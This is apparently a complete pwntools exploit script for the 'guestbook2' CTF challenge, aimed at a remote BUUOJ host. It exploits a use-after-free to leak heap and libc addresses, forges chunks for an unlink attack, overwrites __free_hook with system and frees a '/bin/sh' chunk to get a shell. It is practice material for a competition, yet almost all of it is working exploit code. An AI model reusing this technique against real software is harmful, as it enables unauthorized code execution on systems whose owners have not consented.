# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './guestbook2'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.23-buu.so')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29512'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def show():
    cmd(1)

def add(size , text):
    cmd(2)
    sla('Length of new post: ',size)
    sa('Enter your post:' , text)

def edit(idx ,  size , text):
    cmd(3)
    sla('number:',idx)
    sla('Length of post: ',size)
    sa('Enter your post:' , text)

def delete(idx):
    cmd(4)
    sla('number:',idx)

# one_gad = one_gadget(libc.path)
# 一开始看到的时候只有一个可以 delete 的uaf 有点蒙
# 仔细一想只需要 全部放回 topchunk 后再申请更大的就可以在没有置0的指针所指向的地方为所欲为的构造

def attack():
    
    add(0x78 , 'a'*0x78 )
    add(0x18 , 'a'*0x18)
    add(0x48 , 'a'*0x48 )
    add(0x18 , 'a'*0x18)

    delete(0)
    delete(2)

    add(0x8 , 'a'*0x8)
    add(0x8 , 'a'*0x8)
    show()

    ru('0. aaaaaaaa')
    heap_base = uu64(4) -0x1940
    
    __malloc_hook = l64() - 0x68
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()

    lg('heap_base',heap_base)
    lg('__free_hook',__free_hook)

    delete(0)
    delete(1)
    delete(2)
    delete(3)

    payload = flat(
        0 , 0x81,
        heap_base + 0x30 - 0x18, heap_base + 0x30 - 0x10,
        '\x00'*0x60 ,
        0x80,0x90,
        '\x00'*0x88 , 0x91,
        '\x00'*0x88 , 0x91,
        '\x00'*0x18
    )

    add( len(payload) , payload )
    delete(1)

    payload = flat(
        1,
        1 , 0x10,__free_hook - 8
    )

    edit(0 , 0x1c8 , payload.ljust(0x1c8 , '\x00'))
    edit(0 , 0x10 , flat('/bin/sh\x00' , system_addr))
    delete(0)

    # dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   guestbook2.py
@Time    :   2022/02/04 13:44:47
@Author  :   Niyah 
'''